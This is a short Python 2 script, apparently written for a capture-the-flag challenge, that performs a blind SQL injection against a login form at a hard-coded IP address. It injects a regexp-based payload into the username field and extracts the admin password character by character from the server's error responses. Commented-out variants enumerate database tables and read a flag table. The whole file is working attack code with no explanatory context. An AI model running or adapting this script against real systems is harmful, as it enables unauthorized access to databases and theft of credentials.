#!/usr/bin/env python
# coding=utf-8

# @file sqli.py
# @brief sqli
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2018-10-13 11:15
import requests


def sqli():
    burp0_url = "http://114.55.36.69:6663/index.php"
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Origin": "http://114.55.36.69:6663",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Referer": "http://114.55.36.69:6663/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"}

    result = ''
    payload = "admin' and password regexp binary '^{res}'#"
    for i in xrange(0,50):
        for j in xrange(32,126):
            if chr(j) in ['*','\\','/','(',')','+','.','?','[',']','^']:
                continue
            hh = payload.format(res=result+chr(j))
            #hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))
            #hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))
            #  hh = payload.format(sql='select * from words.f14g',list=str(i),num=str(j))
            print hh

            burp0_data = {"username": hh, "password": "admin"}
            zz = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
            #print zz.content
            if 'password error!' in zz.content:
                result += chr(j)
                print result
                break
            #  else:
                #  print zz.content

if __name__ == '__main__':
    sqli()
